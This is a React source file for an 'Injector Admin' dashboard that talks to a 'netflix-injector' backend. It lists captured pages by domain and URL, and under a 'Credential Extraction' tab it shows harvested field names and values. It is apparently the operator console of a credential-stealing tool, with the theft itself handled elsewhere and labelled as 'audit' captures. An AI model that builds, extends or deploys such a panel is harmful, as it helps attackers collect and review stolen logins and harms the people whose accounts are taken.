import React, { useState, useEffect } from 'react'
import './App.css'

function App() {
  const [activeTab, setActiveTab] = useState('captures')
  const [captures, setCaptures] = useState([])
  const [credentials, setCredentials] = useState([])
  const [loading, setLoading] = useState(false)
  const [stats, setStats] = useState({ total_captures: 0, total_credentials: 0 })

  const API_BASE = 'https://netflix-injector-api.onrender.com/v1/admin'

  useEffect(() => {
    fetchData()
  }, [activeTab])

  const fetchData = async () => {
    setLoading(true)
    try {
      const endpoint = activeTab === 'captures' ? '/captures' : '/credentials'
      const res = await fetch(`${API_BASE}${endpoint}`)
      const json = await res.json()

      if (activeTab === 'captures') {
        setCaptures(json.data || [])
        setStats(prev => ({ ...prev, total_captures: json.total || 0 }))
      } else {
        setCredentials(json.data || [])
        setStats(prev => ({ ...prev, total_credentials: json.total || 0 }))
      }
    } catch (err) {
      console.error('Fetch error:', err)
    } finally {
      setLoading(false)
    }
  }

  const handleDelete = async (id) => {
    if (!window.confirm('Delete this capture?')) return
    try {
      await fetch(`${API_BASE}/captures/${id}`, { method: 'DELETE' })
      fetchData()
    } catch (err) {
      alert('Delete failed')
    }
  }

  return (
    <div className="layout">
      <aside className="sidebar glass">
        <div className="logo">
          <div className="logo-icon">NI</div>
          <span>Injector Admin</span>
        </div>
        <nav>
          <button
            className={activeTab === 'captures' ? 'active' : ''}
            onClick={() => setActiveTab('captures')}
          >
            Audit Captures
          </button>
          <button
            className={activeTab === 'credentials' ? 'active' : ''}
            onClick={() => setActiveTab('credentials')}
          >
            Extracted Data
          </button>
        </nav>
        <div className="sidebar-stats">
          <div className="stat-item">
            <label>Captures</label>
            <span>{stats.total_captures}</span>
          </div>
          <div className="stat-item">
            <label>Credentials</label>
            <span>{stats.total_credentials}</span>
          </div>
        </div>
      </aside>

      <main className="content">
        <header className="content-header">
          <h1>{activeTab === 'captures' ? 'Audit Logs' : 'Credential Extraction'}</h1>
          <button className="refresh-btn" onClick={fetchData}>Refresh</button>
        </header>

        {loading ? (
          <div className="loader">Synchronizing with Node...</div>
        ) : (
          <div className="data-view animate-fade">
            {activeTab === 'captures' ? (
              <table className="admin-table">
                <thead>
                  <tr>
                    <th>Time</th>
                    <th>Type</th>
                    <th>Domain</th>
                    <th>URL</th>
                    <th>Actions</th>
                  </tr>
                </thead>
                <tbody>
                  {captures.map(c => (
                    <tr key={c.id}>
                      <td className="dim">{new Date(c.timestamp).toLocaleString()}</td>
                      <td><span className={`badge ${c.capture_type}`}>{c.capture_type}</span></td>
                      <td className="bold">{c.domain}</td>
                      <td className="dim truncate">{c.url}</td>
                      <td>
                        <button className="delete-btn" onClick={() => handleDelete(c.id)}>Delete</button>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            ) : (
              <div className="creds-grid">
                {credentials.map(cr => (
                  <div key={cr.id} className="cred-card glass">
                    <div className="cred-header">
                      <span className="cred-domain">{cr.domain}</span>
                      <span className="cred-time">{new Date(cr.timestamp).toLocaleDateString()}</span>
                    </div>
                    <div className="cred-body">
                      <div className="field">
                        <label>{cr.field_name}</label>
                        <div className="value">{cr.field_value}</div>
                      </div>
                    </div>
                    <div className="cred-footer">
                      <span className="cred-type">{cr.capture_type}</span>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        )}
      </main>
    </div>
  )
}

export default App
